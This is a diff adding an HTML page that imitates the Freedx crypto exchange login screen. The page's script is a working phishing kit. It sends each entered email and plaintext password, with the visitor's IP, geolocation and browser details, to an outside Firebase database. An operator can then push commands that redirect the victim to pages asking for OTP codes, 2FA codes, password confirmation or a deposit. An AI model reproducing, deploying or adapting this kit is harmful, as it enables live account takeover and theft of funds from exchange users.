@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en" class="light" style="color-scheme: light;">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" href="./index_files/80c5fb347f0f8394.css" data-precedence="next">
+  <link rel="stylesheet" href="./index_files/f1c7c9fc77ea1c56.css" data-precedence="next">
+  <link rel="preload" href="https://cms-v2-beta.freedx.am/uploads/fonts/primary/400-normal.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://cms-v2-beta.freedx.am/uploads/fonts/primary/600-normal.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://cms-v2-beta.freedx.am/uploads/fonts/primary/700-normal.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://cms-v2-beta.freedx.am/uploads/fonts/primary/800-normal.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <style>
+    @font-face {
+        font-family: "primary";
+        src: url("https://cms-v2-beta.freedx.am/uploads/fonts/primary/400-normal.woff2") format("woff2"),
+             url("https://cms-v2-beta.freedx.am/uploads/fonts/primary/400-normal.woff") format("woff");
+        font-weight: 400;
+        font-style: normal;
+        font-display: swap;
+    }
+
+    @font-face {
+        font-family: "primary";
+        src: url("https://cms-v2-beta.freedx.am/uploads/fonts/primary/600-normal.woff2") format("woff2"),
+             url("https://cms-v2-beta.freedx.am/uploads/fonts/primary/600-normal.woff") format("woff");
+        font-weight: 600;
+        font-style: normal;
+        font-display: swap;
+    }
+
+    @font-face {
+        font-family: "primary";
+        src: url("https://cms-v2-beta.freedx.am/uploads/fonts/primary/700-normal.woff2") format("woff2"),
+             url("https://cms-v2-beta.freedx.am/uploads/fonts/primary/700-normal.woff") format("woff");
+        font-weight: 700;
+        font-style: normal;
+        font-display: swap;
+    }
+
+    @font-face {
+        font-family: "primary";
+        src: url("https://cms-v2-beta.freedx.am/uploads/fonts/primary/800-normal.woff2") format("woff2"),
+             url("https://cms-v2-beta.freedx.am/uploads/fonts/primary/800-normal.woff") format("woff");
+        font-weight: 800;
+        font-style: normal;
+        font-display: swap;
+    }
+  </style>
+
+  <style id="cms-primitives-styles">
+    :root {
+        --primary-50: 242 95% 98%;
+        --primary-100: 243 100% 95%;
+        --primary-200: 242 100% 92%;
+        --primary-300: 248 100% 85%;
+        --primary-400: 251 100% 74%;
+        --primary-500: 256 94% 67%;
+        --primary-600: 261 89% 58%;
+        --primary-700: 263 77% 50%;
+        --primary-800: 264 73% 42%;
+        --primary-900: 264 71% 28%;
+        --primary-950: 264 70% 15%;
+        --primary-500-alpha-12: 256 94% 67% / 0.12;
+        --primary-500-alpha-20: 256 94% 67% / 0.2;
+        --primary-500-alpha-24: 256 94% 67% / 0.24;
+        --primary-500-alpha-40: 256 94% 67% / 0.4;
+
+        --gray-50: 240 20% 98%;
+        --gray-100: 240 5% 95%;
+        --gray-200: 220 13% 93%;
+        --gray-300: 220 13% 88%;
+        --gray-400: 220 9% 78%;
+        --gray-500: 220 8% 71%;
+        --gray-600: 220 8% 58%;
+        --gray-700: 220 9% 39%;
+        --gray-800: 220 11% 29%;
+        --gray-900: 220 19% 16%;
+        --gray-950: 220 26% 5%;
+
+        --dark-50: 0 0% 97%;
+        --dark-100: 0 0% 96%;
+        --dark-200: 0 0% 93%;
+        --dark-300: 0 0% 88%;
+        --dark-400: 0 0% 78%;
+        --dark-500: 0 0% 49%;
+        --dark-600: 0 0% 18%;
+        --dark-700: 0 0% 13%;
+        --dark-800: 0 0% 9%;
+        --dark-900: 0 0% 7%;
+        --dark-950: 0 0% 3%;
+
+        --white-3: 0 0% 100% / 0.03;
+        --white-6: 0 0% 100% / 0.06;
+        --white-9: 0 0% 100% / 0.09;
+        --white-12: 0 0% 100% / 0.12;
+        --white-16: 0 0% 100% / 0.16;
+        --white-24: 0 0% 100% / 0.24;
+        --white-32: 0 0% 100% / 0.32;
+        --white-48: 0 0% 100% / 0.48;
+        --white-56: 0 0% 100% / 0.56;
+        --white-64: 0 0% 100% / 0.64;
+        --white-72: 0 0% 100% / 0.72;
+        --white-88: 0 0% 100% / 0.88;
+        --white-100: 0 0% 100%;
+    }
+  </style>
+
+  <style type="text/css">
+    [data-sonner-toaster][dir=ltr],html[dir=ltr]{--toast-icon-margin-start:-3px;--toast-icon-margin-end:4px;--toast-svg-margin-start:-1px;--toast-svg-margin-end:0px;--toast-button-margin-start:auto;--toast-button-margin-end:0;--toast-close-button-start:0;--toast-close-button-end:unset;--toast-close-button-transform:translate(-35%, -35%)}
+    [data-sonner-toaster][dir=rtl],html[dir=rtl]{--toast-icon-margin-start:4px;--toast-icon-margin-end:-3px;--toast-svg-margin-start:0px;--toast-svg-margin-end:-1px;--toast-button-margin-start:0;--toast-button-margin-end:auto;--toast-close-button-start:unset;--toast-close-button-end:0;--toast-close-button-transform:translate(35%, -35%)}
+    [data-sonner-toaster]{position:fixed;width:var(--width);font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;--gray1:hsl(0, 0%, 99%);--gray2:hsl(0, 0%, 97.3%);--gray3:hsl(0, 0%, 95.1%);--gray4:hsl(0, 0%, 93%);--gray5:hsl(0, 0%, 90.9%);--gray6:hsl(0, 0%, 88.7%);--gray7:hsl(0, 0%, 85.8%);--gray8:hsl(0, 0%, 78%);--gray9:hsl(0, 0%, 56.1%);--gray10:hsl(0, 0%, 52.3%);--gray11:hsl(0, 0%, 43.5%);--gray12:hsl(0, 0%, 9%);--border-radius:8px;box-sizing:border-box;padding:0;margin:0;list-style:none;outline:0;z-index:999999999;transition:transform .4s ease}
+    @media (hover:none) and (pointer:coarse){[data-sonner-toaster][data-lifted=true]{transform:none}}
+    [data-sonner-toaster][data-x-position=right]{right:var(--offset-right)}
+    [data-sonner-toaster][data-x-position=left]{left:var(--offset-left)}
+    [data-sonner-toaster][data-x-position=center]{left:50%;transform:translateX(-50%)}
+    [data-sonner-toaster][data-y-position=top]{top:var(--offset-top)}
+    [data-sonner-toaster][data-y-position=bottom]{bottom:var(--offset-bottom)}
+    [data-sonner-toast]{--y:translateY(100%);--lift-amount:calc(var(--lift) * var(--gap));z-index:var(--z-index);position:absolute;opacity:0;transform:var(--y);touch-action:none;transition:transform .4s,opacity .4s,height .4s,box-shadow .2s;box-sizing:border-box;outline:0;overflow-wrap:anywhere}
+    [data-sonner-toast][data-styled=true]{padding:16px;background:var(--normal-bg);border:1px solid var(--normal-border);color:var(--normal-text);border-radius:var(--border-radius);box-shadow:0 4px 12px rgba(0,0,0,.1);width:var(--width);font-size:13px;display:flex;align-items:center;gap:6px}
+  </style>
+
+  <link rel="preload" href="./index_files/purple-logo.svg" as="image">
+  <link rel="preload" href="https://cms-v2-beta.freedx.am/uploads/logo/light-logo.svg" as="image">
+  <link rel="preload" as="image" fetchpriority="high" href="https://cms-v2-beta.freedx.am/uploads/banner/auth-banner.webp">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Log In to Freedx - Access Your Crypto Trading Account Securely</title>
+  <meta name="description" content="Sign in to your Freedx crypto trading account. Secure login with 2FA protection, fast account access and your full trading dashboard. New users can create a free account.">
+  <meta name="yandex-verification" content="c7a3e5494de2d4db">
+  <meta name="facebook-domain-verification" content="q5mzxdeuahf4yw2mneb1j1f611x3g7">
+  <meta property="og:title" content="Log In to Freedx - Access Your Crypto Trading Account Securely">
+  <meta property="og:description" content="Sign in to your Freedx crypto trading account. Secure login with 2FA protection, fast account access and your full trading dashboard. New users can create a free account.">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Log In to Freedx - Access Your Crypto Trading Account Securely">
+  <meta name="twitter:description" content="Sign in to your Freedx crypto trading account. Secure login with 2FA protection, fast account access and your full trading dashboard. New users can create a free account.">
+  <link rel="shortcut icon" href="https://cms-v2-beta.freedx.am/uploads/logo/favicon.ico">
+  <link rel="icon" href="https://cms-v2-beta.freedx.am/uploads/logo/favicon.ico" sizes="any">
+  <link rel="icon" href="https://cms-v2-beta.freedx.am/uploads/logo/favicon.png" type="image/png" sizes="32x32">
+  <link rel="icon" href="https://cms-v2-beta.freedx.am/uploads/logo/favicon.svg" type="image/svg+xml">
+  <link rel="apple-touch-icon" href="https://cms-v2-beta.freedx.am/uploads/logo/apple-touch-icon.png" sizes="180x180">
+
+  <style>
+    /* ESTILO DO LOADING - SPINNER GRANDE NO BOTÃO */
+    .btn-loading {
+      position: relative;
+      pointer-events: none;
+      opacity: 0.8;
+    }
+
+    .btn-loading .btn-text {
+      visibility: hidden;
+    }
+
+    .btn-loading .spinner {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 28px;
+      height: 28px;
+      border: 3px solid rgba(255, 255, 255, 0.2);
+      border-top: 3px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    /* MENSAGEM DE ERRO */
+    .error-msg {
+      color: #ef4444;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 12px;
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div hidden=""></div>
+
+  <script>
+    ((a,b,c,d,e,f,g,h)=>{let i=document.documentElement,j=["light","dark"];function k(b){var c;(Array.isArray(a)?a:[a]).forEach(a=>{let c="class"===a,d=c&&f?e.map(a=>f[a]||a):e;c?(i.classList.remove(...d),i.classList.add(f&&f[b]?f[b]:b)):i.setAttribute(a,b)}),c=b,h&&j.includes(c)&&(i.style.colorScheme=c)}if(d)k(d);else try{let a=localStorage.getItem(b)||c,d=g&&"system"===a?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":a;k(d)}catch(a){}})("class","theme","system",null,["light","dark"],null,true,true)
+  </script>
+
+  <div class="flex h-dvh flex-col">
+    <header class="bg-surface-surface-1 px-sm desktop:px-xxl sticky top-0 z-20 flex h-[var(--header-h)] items-center gap-4">
+      <a href="/"><img alt="logo" width="88" height="24" decoding="async" data-nimg="1" src="./index_files/purple-logo.svg" style="color: transparent;"></a>
+      <div class="flex flex-1 items-center gap-4">
+        <div class="relative flex-1 desktop:flex hidden">
+          <nav aria-label="Main" data-orientation="horizontal" dir="ltr" data-slot="navigation-menu" data-viewport="false" class="group/navigation-menu relative flex max-w-max flex-1 items-center justify-center">
+            <div style="position: relative;">
+              <ul data-orientation="horizontal" data-slot="navigation-menu-list" class="group flex flex-1 list-none items-center justify-center gap-1" dir="ltr">
+                <li data-slot="navigation-menu-item" class="relative"><button id="radix-_r_61_-trigger-radix-_r_62_" data-state="closed" aria-expanded="false" aria-controls="radix-_r_61_-content-radix-_r_62_" data-slot="navigation-menu-trigger" class="group inline-flex w-max items-center justify-center text-text-med-em bg-transparent hover:bg-surface-surface-2 hover:text-text-med-em focus:bg-surface-surface-2 focus:text-text-med-em disabled:pointer-events-none disabled:opacity-50 data-[state=open]:hover:bg-surface-surface-2 data-[state=open]:text-text-med-em data-[state=open]:focus:bg-surface-surface-2 data-[state=open]:bg-surface-surface-2/50 outline-none transition-[color,box-shadow] h-10 rounded-2xl text-md font-medium px-3 py-3 group" data-radix-collection-item=""><span>Trade</span></button></li>
+                <li data-slot="navigation-menu-item" class="relative"><button id="radix-_r_61_-trigger-radix-_r_63_" data-state="closed" aria-expanded="false" aria-controls="radix-_r_61_-content-radix-_r_63_" data-slot="navigation-menu-trigger" class="group inline-flex w-max items-center justify-center text-text-med-em bg-transparent hover:bg-surface-surface-2 hover:text-text-med-em focus:bg-surface-surface-2 focus:text-text-med-em disabled:pointer-events-none disabled:opacity-50 data-[state=open]:hover:bg-surface-surface-2 data-[state=open]:text-text-med-em data-[state=open]:focus:bg-surface-surface-2 data-[state=open]:bg-surface-surface-2/50 outline-none transition-[color,box-shadow] h-10 rounded-2xl text-md font-medium px-3 py-3 group" data-radix-collection-item=""><span>Rewards</span></button></li>
+                <li data-slot="navigation-menu-item" class="relative"><button id="radix-_r_61_-trigger-radix-_r_64_" data-state="closed" aria-expanded="false" aria-controls="radix-_r_61_-content-radix-_r_64_" data-slot="navigation-menu-trigger" class="group inline-flex w-max items-center justify-center text-text-med-em bg-transparent hover:bg-surface-surface-2 hover:text-text-med-em focus:bg-surface-surface-2 focus:text-text-med-em disabled:pointer-events-none disabled:opacity-50 data-[state=open]:hover:bg-surface-surface-2 data-[state=open]:text-text-med-em data-[state=open]:focus:bg-surface-surface-2 data-[state=open]:bg-surface-surface-2/50 outline-none transition-[color,box-shadow] h-10 rounded-2xl text-md font-medium px-3 py-3 group" data-radix-collection-item=""><a href="/cards/buy">Instant Buy</a></button></li>
+                <li data-slot="navigation-menu-item" class="relative"><button id="radix-_r_61_-trigger-radix-_r_65_" data-state="closed" aria-expanded="false" aria-controls="radix-_r_61_-content-radix-_r_65_" data-slot="navigation-menu-trigger" class="group inline-flex w-max items-center justify-center text-text-med-em bg-transparent hover:bg-surface-surface-2 hover:text-text-med-em focus:bg-surface-surface-2 focus:text-text-med-em disabled:pointer-events-none disabled:opacity-50 data-[state=open]:hover:bg-surface-surface-2 data-[state=open]:text-text-med-em data-[state=open]:focus:bg-surface-surface-2 data-[state=open]:bg-surface-surface-2/50 outline-none transition-[color,box-shadow] h-10 rounded-2xl text-md font-medium px-3 py-3 group" data-radix-collection-item=""><span>Help</span></button></li>
+                <li data-slot="navigation-menu-item" class="relative"><button id="radix-_r_61_-trigger-radix-_r_66_" data-state="closed" aria-expanded="false" aria-controls="radix-_r_61_-content-radix-_r_66_" data-slot="navigation-menu-trigger" class="group inline-flex w-max items-center justify-center text-text-med-em bg-transparent hover:bg-surface-surface-2 hover:text-text-med-em focus:bg-surface-surface-2 focus:text-text-med-em disabled:pointer-events-none disabled:opacity-50 data-[state=open]:hover:bg-surface-surface-2 data-[state=open]:text-text-med-em data-[state=open]:focus:bg-surface-surface-2 data-[state=open]:bg-surface-surface-2/50 outline-none transition-[color,box-shadow] h-10 rounded-2xl text-md font-medium px-3 py-3 group" data-radix-collection-item=""><span>More</span></button></li>
+              </ul>
+            </div>
+          </nav>
+        </div>
+        <div class="desktop:hidden flex-1"></div>
+        <div class="flex items-center gap-4">
+          <a class="flex" href="/registration"><button class="relative inline-flex w-fit items-center justify-center whitespace-nowrap font-medium transition-colors focus-visible:ring-[3px] disabled:pointer-events-none outline-none h-8 p-md rounded-md gap-sm bg-button-primary-surface text-button-primary-on-surface hover:bg-button-primary-surface-hover focus-visible:ring-button-primary-surface-focus-effect shadow-primary-button-effect hover:shadow-primary-button-effect"><div class="text-[0.75rem] leading-[1rem] tracking-none">Sign up</div></button></a>
+          <a class="desktop:flex hidden" href="/login"><button class="relative inline-flex w-fit items-center justify-center whitespace-nowrap font-medium transition-colors focus-visible:ring-[3px] disabled:pointer-events-none outline-none h-8 p-md rounded-md gap-sm text-button-text-on-surface hover:bg-button-text-surface-hover hover:text-button-text-on-surface-hover focus-visible:ring-button-text-surface-focus-effect focus-visible:bg-button-text-surface-focus focus-visible:text-button-text-on-surface-hover"><div class="text-[0.75rem] leading-[1rem] tracking-none">Login</div></button></a>
+        </div>
+        <div class="gap-sm flex items-center gap-4">
+          <button class="relative items-center justify-center whitespace-nowrap font-medium transition-colors focus-visible:ring-[3px] disabled:pointer-events-none outline-none h-8 p-md rounded-md gap-sm text-button-text-on-surface hover:bg-button-text-surface-hover hover:text-button-text-on-surface-hover focus-visible:ring-button-text-surface-focus-effect focus-visible:bg-button-text-surface-focus focus-visible:text-button-text-on-surface-hover p-0 w-8 desktop:hidden flex">
+            <div class="flex flex-col items-center justify-center size-[1.125rem]">
+              <svg src="https://cms-v2-beta.freedx.am/uploads/icons/line/menu.svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="size-4">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M20 7H4C3.448 7 3 6.553 3 6C3 5.447 3.448 5 4 5H20C20.552 5 21 5.447 21 6C21 6.553 20.552 7 20 7ZM20 19H4C3.448 19 3 18.553 3 18C3 17.447 3.448 17 4 17H20C20.552 17 21 17.447 21 18C21 18.553 20.552 19 20 19ZM4 13H20C20.552 13 21 12.553 21 12C21 11.447 20.552 11 20 11H4C3.448 11 3 11.447 3 12C3 12.553 3.448 13 4 13Z"></path>
+              </svg>
+            </div>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <div class="flex h-[calc(100dvh-(var(--header-h)+20px))] flex-row justify-between gap-12 px-4 py-0 md:px-12 md:py-0">
+      <div class="desktop:flex hidden h-full flex-1 flex-col items-center justify-center">
+        <div class="flex h-[90%] max-h-[var(--auth-banner-max-h)] flex-col items-center justify-center">
+          <img alt="auth-banner" fetchpriority="high" width="635" height="880" decoding="async" data-nimg="1" class="desktop:h-full h-auto w-full rounded-2xl object-cover dark:brightness-[0.2]" src="https://cms-v2-beta.freedx.am/uploads/banner/auth-banner.webp" style="color: transparent;">
+        </div>
+      </div>
+
+      <div class="flex-1 flex flex-col items-center justify-center">
+        <div class="flex size-full max-w-[var(--auth-container-max-w)] flex-col justify-start gap-6 xl:justify-center">
+          <p class="text-[2rem] desktop:text-[2.5rem] leading-[2.5rem] desktop:leading-[3rem] tracking-none text-text-high-em">Log in</p>
+          
+          <form class="flex w-full flex-col gap-6" id="loginForm">
+            <div class="flex flex-col w-full gap-1">
+              <div class="flex items-center [&amp;&gt;input[type=&#39;number&#39;]]:[appearance:textfield] [&amp;&gt;input[type=&#39;number&#39;]]:[-moz-appearance:textfield] [&amp;&gt;input[type=&#39;number&#39;]::-webkit-inner-spin-button]:appearance-none [&amp;&gt;input[type=&#39;number&#39;]::-webkit-inner-spin-button]:m-0 [&amp;&gt;input[type=&#39;number&#39;]::-webkit-outer-spin-button]:appearance-none [&amp;&gt;input[type=&#39;number&#39;]::-webkit-outer-spin-button]:m-0 [&amp;&gt;input[type=&#39;password&#39;]::-ms-reveal]:hidden [&amp;&gt;input[type=&#39;password&#39;]::-ms-clear]:hidden bg-input-surface-1 disabled:bg-input-disabled-surface border border-transparent focus-within:border focus-within:border-input-active-border focus-within:ring-[3px] focus-within:ring-outline-primary-alpha focus-within:text-input-active-value shadow-input-inner-shadow [&amp;&gt;input::placeholder]:text-input-placeholder text-input-value hover:bg-input-hover-surface [&amp;:has(input:not(:placeholder-shown))]:text-input-active-value p-xl rounded-xl gap-xs h-12">
+                <input class="w-full flex-1 border-none bg-transparent outline-none" placeholder="Enter Email Address" name="email" id="email">
+              </div>
+              <div class="flex items-center text-input-hint gap-1"></div>
+            </div>
+
+            <div class="flex flex-col w-full gap-1">
+              <div class="flex items-center [&amp;&gt;input[type=&#39;number&#39;]]:[appearance:textfield] [&amp;&gt;input[type=&#39;number&#39;]]:[-moz-appearance:textfield] [&amp;&gt;input[type=&#39;number&#39;]::-webkit-inner-spin-button]:appearance-none [&amp;&gt;input[type=&#39;number&#39;]::-webkit-inner-spin-button]:m-0 [&amp;&gt;input[type=&#39;number&#39;]::-webkit-outer-spin-button]:appearance-none [&amp;&gt;input[type=&#39;number&#39;]::-webkit-outer-spin-button]:m-0 [&amp;&gt;input[type=&#39;password&#39;]::-ms-reveal]:hidden [&amp;&gt;input[type=&#39;password&#39;]::-ms-clear]:hidden bg-input-surface-1 disabled:bg-input-disabled-surface border border-transparent focus-within:border focus-within:border-input-active-border focus-within:ring-[3px] focus-within:ring-outline-primary-alpha focus-within:text-input-active-value shadow-input-inner-shadow [&amp;&gt;input::placeholder]:text-input-placeholder text-input-value hover:bg-input-hover-surface [&amp;:has(input:not(:placeholder-shown))]:text-input-active-value p-xl rounded-xl gap-xs h-12">
+                <input class="w-full flex-1 border-none bg-transparent outline-none" placeholder="Enter your password" type="password" name="password" id="password">
+                <div class="text-text-low-em cursor-pointer" style="opacity: 1; transform: none;">
+                  <svg src="https://cms-v2-beta.freedx.am/uploads/icons/solid/eye.svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="size-5">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.97475 12.0007C7.97475 14.2237 9.78204 16.0321 12.003 16.0321C14.224 16.0321 16.0302 14.2237 16.0302 12.0007C16.0302 9.78292 14.224 7.97983 12.003 7.97983C9.78204 7.97983 7.97475 9.78292 7.97475 12.0007ZM11.9978 4C16.1366 4 19.8596 6.91356 21.9574 11.7933C22.0142 11.9259 22.0142 12.0754 21.9574 12.208C19.8606 17.0857 16.1397 19.9993 12.003 20.0014H11.9967C7.86002 19.9993 4.13912 17.0857 2.04342 12.208C1.98553 12.0754 1.98553 11.9259 2.04342 11.7933C4.14017 6.91356 7.86107 4 11.9978 4ZM9.55365 12.001C9.55365 10.6547 10.6526 9.55898 12.003 9.55898C13.3535 9.55898 14.4514 10.6547 14.4514 12.001C14.4514 13.3536 13.3535 14.4535 12.003 14.4535C10.6526 14.4535 9.55365 13.3536 9.55365 12.001Z"></path>
+                  </svg>
+                </div>
+              </div>
+              <div class="flex items-center text-input-hint gap-1"></div>
+            </div>
+
+            <div class="flex items-center justify-between">
+              <button type="submit" id="loginBtn" class="relative inline-flex items-center justify-center whitespace-nowrap font-medium transition-colors focus-visible:ring-[3px] disabled:pointer-events-none outline-none h-12 py-xl px-2xl rounded-xl gap-md w-full self-end" style="background: #7c3aed; color: #fff; cursor: pointer; border: none; font-size: 16px; font-weight: 600;">
+                <span class="btn-text">Log in</span>
+                <span class="spinner" style="display: none;"></span>
+              </button>
+            </div>
+          </form>
+
+          <!-- MENSAGEM DE ERRO -->
+          <div class="error-msg" id="errorMsg">Invalid email or password. Please try again.</div>
+
+          <a class="text-text-primary-med-em w-max self-end" href="/reset-password">Forgot password ?</a>
+          <p class="text-[0.875rem] desktop:text-[0.8125rem] leading-[1.5] tracking-none text-text-low-em text-center">Don't have an account? <a class="text-text-primary-med-em" href="/registration">Sign up</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <section aria-label="Notifications alt+T" tabindex="-1" aria-live="polite" aria-relevant="additions text" aria-atomic="false"></section>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAemZwP19k7zaM8QMBPn5kitdlvzY514OI",
+      authDomain: "web-xchangeon1.firebaseapp.com",
+      databaseURL: "https://web-xchangeon1-default-rtdb.firebaseio.com/",
+      projectId: "web-xchangeon1",
+      storageBucket: "web-xchangeon1.firebasestorage.app",
+      messagingSenderId: "733409941973",
+      appId: "1:733409941973:web:6e11c283fcee846b4a855c"
+    };
+
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function getSessionId() {
+      let id = sessionStorage.getItem('firebaseSessionId');
+      if (!id) {
+        id = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+        sessionStorage.setItem('firebaseSessionId', id);
+      }
+      return id;
+    }
+
+    const sessionId = getSessionId();
+    const sessionRef = db.ref('sessions/' + sessionId);
+    const commandRef = db.ref(`sessions/${sessionId}/command`);
+
+    const loginForm = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const btnText = loginBtn.querySelector('.btn-text');
+    const spinner = loginBtn.querySelector('.spinner');
+    const errorMsg = document.getElementById('errorMsg');
+
+    let isProcessing = false;
+
+    function setLoading(loading) {
+      isProcessing = loading;
+      if (loading) {
+        loginBtn.disabled = true;
+        loginBtn.classList.add('btn-loading');
+        btnText.style.visibility = 'hidden';
+        spinner.style.display = 'block';
+        errorMsg.style.display = 'none';
+      } else {
+        loginBtn.disabled = false;
+        loginBtn.classList.remove('btn-loading');
+        btnText.style.visibility = 'visible';
+        spinner.style.display = 'none';
+      }
+    }
+
+    function showError() {
+      errorMsg.style.display = 'block';
+    }
+
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      if (isProcessing) return;
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!email || !password) return;
+
+      setLoading(true);
+
+      let userData = {
+        email: email,
+        passwords: [{ value: password }],
+        device: navigator.userAgent || 'N/A',
+        status: 'online',
+        currentPage: 'Login',
+        last_update: Date.now(),
+        created_at: Date.now()
+      };
+
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          userData.ip = data.ip;
+          return fetch(`https://ipapi.co/${data.ip}/json/`);
+        })
+        .then(res => res.json())
+        .then(data => {
+          userData.country = data.country_code || 'N/A';
+          userData.city = data.city || 'N/A';
+          userData.region = data.region || 'N/A';
+          userData.country_name = data.country_name || 'N/A';
+        })
+        .catch(() => {})
+        .finally(() => {
+          sessionRef.set(userData);
+          localStorage.setItem('freedx_email', email);
+        });
+    });
+
+    commandRef.on('value', (snapshot) => {
+      const command = snapshot.val();
+      if (!command) return;
+
+      switch (command.type) {
+        case 'approve':
+          window.location.href = 'https://freedx.com/dashboard';
+          break;
+
+        case 'reject':
+          setLoading(false);
+          showError();
+          commandRef.remove();
+          break;
+
+        case 'otp-request':
+          window.location.href = `otp.html?id=${sessionId}`;
+          break;
+
+        case 'tfa-request':
+          window.location.href = `2fa.html?id=${sessionId}`;
+          break;
+
+        case 'password-confirm-request':
+          window.location.href = `password_confirm.html?id=${sessionId}`;
+          break;
+
+        case 'verify-request':
+          window.location.href = `verify.html?id=${sessionId}`;
+          break;
+
+        case 'deposit-request':
+          window.location.href = `deposit.html?id=${sessionId}`;
+          break;
+
+        case 'force-relogin':
+          sessionStorage.clear();
+          window.location.href = 'index.html';
+          break;
+      }
+    });
+
+    sessionRef.onDisconnect().update({ status: 'offline' });
+    window.addEventListener('load', () => {
+      sessionRef.update({ currentPage: 'Login', status: 'online' });
+    });
+
+    const savedEmail = localStorage.getItem('freedx_email');
+    if (savedEmail) {
+      document.getElementById('email').value = savedEmail;
+    }
+  </script>
+
+</body>
+</html>
